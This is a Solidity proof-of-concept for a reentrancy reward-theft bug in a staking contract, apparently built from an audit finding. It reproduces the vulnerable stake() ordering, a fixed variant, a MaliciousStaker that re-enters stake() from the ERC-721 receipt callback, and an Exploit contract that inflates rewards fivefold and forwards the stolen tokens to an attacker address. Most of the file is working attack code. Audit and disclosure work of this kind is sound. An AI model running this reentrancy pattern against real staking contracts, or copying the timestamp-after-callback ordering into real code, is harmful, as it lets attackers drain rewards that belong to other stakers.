// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// =============================================================================
//  Zero Staking 59357 — reentrancy reward theft in StakingERC721.stake()
//  (Quantstamp, StakingERC721.sol / StakingERC20.sol).
//
//  stake() accrues pending rewards from (now - staker.lastUpdatedTimestamp) but
//  only writes staker.lastUpdatedTimestamp at the VERY END of the call. In the
//  middle it calls _safeMint(), which invokes onERC721Received() on the staker.
//  A malicious staker re-enters stake() during that callback: because
//  lastUpdatedTimestamp is still the STALE value, _checkRewards() credits the
//  SAME elapsed window again on every reentry, inflating owedRewards to an
//  arbitrary multiple of the honest amount. The staker then claims the inflated
//  balance in real reward tokens = theft of other stakers' rewards.
//
//  The vulnerable stake()/_checkRewards() ordering is reproduced VERBATIM
//  (marked @>). Tokens, the receipt-mint callback, and a settable clock are
//  faithful minimal doubles. Local deploy, no fork, no cheatcodes.
//
//  NOTE ON TIME: the real contract reads block.timestamp. A single transaction
//  cannot advance block.timestamp, so this double abstracts the time source into
//  a settable `currentTime` clock (advanceTime()) — the accrual/reentry logic is
//  otherwise identical. The driver's control test uses the same clock.
// =============================================================================

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

interface IStaking {
    function stake(uint256 amount) external;
    function claim() external;
    function advanceTime(uint256 secs) external;
}

// Minimal ERC20-style reward token.
contract MiniToken {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _symbol) {
        symbol = _symbol;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/*//////////////////////////////////////////////////////////////
   StakingERC721 — VULNERABLE. Time-based reward accrual whose
   lastUpdatedTimestamp is written only AFTER the _safeMint callback.
//////////////////////////////////////////////////////////////*/
contract StakingERC721 {
    struct Staker {
        uint256 amountStaked;
        uint256 owedRewards;
        uint256 lastUpdatedTimestamp;
    }

    MiniToken public immutable rewardToken;
    uint256 public constant REWARDS_PER_SEC = 1e18; // reward units / sec / staked token
    uint256 public currentTime = 1; // virtual clock (real contract: block.timestamp)
    uint256 public nextTokenId;

    mapping(address => Staker) public stakers;

    constructor(MiniToken _rewardToken) {
        rewardToken = _rewardToken;
    }

    // Setup/demo helper standing in for the passage of block.timestamp.
    function advanceTime(uint256 secs) external {
        currentTime += secs;
    }

    // Pending rewards for the elapsed window since the staker's last update.
    function _checkRewards(Staker storage staker) internal view returns (uint256) {
        return ((currentTime - staker.lastUpdatedTimestamp) * REWARDS_PER_SEC * staker.amountStaked) / 1e18; // @> uses STALE lastUpdatedTimestamp — re-credited on every reentry
    }

    function stake(uint256 amount) external {
        Staker storage staker = stakers[msg.sender];

        staker.owedRewards += _checkRewards(staker); // @> accrue against the not-yet-updated timestamp
        staker.amountStaked += amount;

        _safeMint(msg.sender, nextTokenId++); // @> external onERC721Received callback fires BEFORE the timestamp is updated

        staker.lastUpdatedTimestamp = currentTime; // @> lastUpdatedTimestamp written only at the END of stake()
    }

    function claim() external {
        Staker storage staker = stakers[msg.sender];
        staker.owedRewards += _checkRewards(staker);
        staker.lastUpdatedTimestamp = currentTime;

        uint256 amount = staker.owedRewards;
        staker.owedRewards = 0;
        rewardToken.transfer(msg.sender, amount);
    }

    // ERC721-receipt mint: notifies a contract receiver, enabling reentrancy.
    function _safeMint(address to, uint256 tokenId) internal {
        if (to.code.length > 0) {
            require(
                IERC721Receiver(to).onERC721Received(msg.sender, address(0), tokenId, "")
                    == IERC721Receiver.onERC721Received.selector,
                "bad receiver"
            );
        }
    }
}

/*//////////////////////////////////////////////////////////////
   StakingERC721Fixed — mitigation (finding rec #2): write
   lastUpdatedTimestamp BEFORE the external _safeMint callback so a
   reentrant stake() sees a zero elapsed window and accrues nothing.
//////////////////////////////////////////////////////////////*/
contract StakingERC721Fixed {
    struct Staker {
        uint256 amountStaked;
        uint256 owedRewards;
        uint256 lastUpdatedTimestamp;
    }

    MiniToken public immutable rewardToken;
    uint256 public constant REWARDS_PER_SEC = 1e18;
    uint256 public currentTime = 1;
    uint256 public nextTokenId;

    mapping(address => Staker) public stakers;

    constructor(MiniToken _rewardToken) {
        rewardToken = _rewardToken;
    }

    function advanceTime(uint256 secs) external {
        currentTime += secs;
    }

    function _checkRewards(Staker storage staker) internal view returns (uint256) {
        return ((currentTime - staker.lastUpdatedTimestamp) * REWARDS_PER_SEC * staker.amountStaked) / 1e18;
    }

    function stake(uint256 amount) external {
        Staker storage staker = stakers[msg.sender];

        staker.owedRewards += _checkRewards(staker);
        staker.amountStaked += amount;
        staker.lastUpdatedTimestamp = currentTime; // FIX: finalize timestamp BEFORE any external call

        _safeMint(msg.sender, nextTokenId++);
    }

    function claim() external {
        Staker storage staker = stakers[msg.sender];
        staker.owedRewards += _checkRewards(staker);
        staker.lastUpdatedTimestamp = currentTime;

        uint256 amount = staker.owedRewards;
        staker.owedRewards = 0;
        rewardToken.transfer(msg.sender, amount);
    }

    function _safeMint(address to, uint256 tokenId) internal {
        if (to.code.length > 0) {
            require(
                IERC721Receiver(to).onERC721Received(msg.sender, address(0), tokenId, "")
                    == IERC721Receiver.onERC721Received.selector,
                "bad receiver"
            );
        }
    }
}

/*//////////////////////////////////////////////////////////////
   MaliciousStaker — the receipt receiver. On the _safeMint callback
   it re-enters stake(0) REENTRIES times; each reentry re-credits the
   same stale elapsed window, multiplying owedRewards.
//////////////////////////////////////////////////////////////*/
contract MaliciousStaker is IERC721Receiver {
    uint256 public constant REENTRIES = 4; // extra stale-window credits (→ 5x total)

    IStaking public immutable staking;
    bool public armed;
    uint256 public depth;

    constructor(IStaking _staking) {
        staking = _staking;
    }

    function initialStake(uint256 amount) external {
        staking.stake(amount); // armed == false: callback does not reenter
    }

    function exploitStake() external {
        armed = true;
        staking.stake(0); // arms the reentry cascade during the mint callback
        armed = false;
    }

    function claim() external {
        staking.claim();
    }

    function forward(MiniToken token, address to) external {
        token.transfer(to, token.balanceOf(address(this)));
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        if (armed && depth < REENTRIES) {
            depth++;
            staking.stake(0); // @> reentry: lastUpdatedTimestamp still stale, window credited again
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}

/*//////////////////////////////////////////////////////////////
   Exploit — stakes, lets time elapse, then reenters stake() during
   the mint callback to inflate rewards 5x and claims real tokens.
//////////////////////////////////////////////////////////////*/
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    uint256 internal constant STAKE_AMT = 1e18; // 1 staked token
    uint256 internal constant ELAPSED = 1000; // seconds accrued before the exploit
    uint256 internal constant REWARD_FUND = 1_000_000e18; // reward tokens held by the staking contract

    MiniToken public rewardToken;
    StakingERC721 public staking;
    MaliciousStaker public attacker;

    uint256 public fairRewards; // honest single-window accrual
    uint256 public exploitRewards; // rewards actually claimed via reentrancy
    uint256 public stolenExtra; // exploit - fair

    function run() external payable {
        // Unconditional, fixed-order helper creation (deterministic addresses).
        rewardToken = new MiniToken("RWD");
        staking = new StakingERC721(rewardToken);
        attacker = new MaliciousStaker(IStaking(address(staking)));

        // Staking contract holds the shared reward pool.
        rewardToken.mint(address(staking), REWARD_FUND);

        // Attacker stakes at T0, then ELAPSED seconds pass.
        attacker.initialStake(STAKE_AMT);
        staking.advanceTime(ELAPSED);

        // Honest reference: a single accrual of the elapsed window.
        fairRewards = (ELAPSED * staking.REWARDS_PER_SEC() * STAKE_AMT) / 1e18;

        // Exploit: reenter stake() during the mint callback to re-credit the
        // stale window REENTRIES extra times, then claim the inflated balance.
        attacker.exploitStake();
        attacker.claim();

        exploitRewards = rewardToken.balanceOf(address(attacker));
        stolenExtra = exploitRewards - fairRewards;

        // Forward the stolen reward tokens to the attacker EOA.
        attacker.forward(rewardToken, ATTACKER);
    }
}
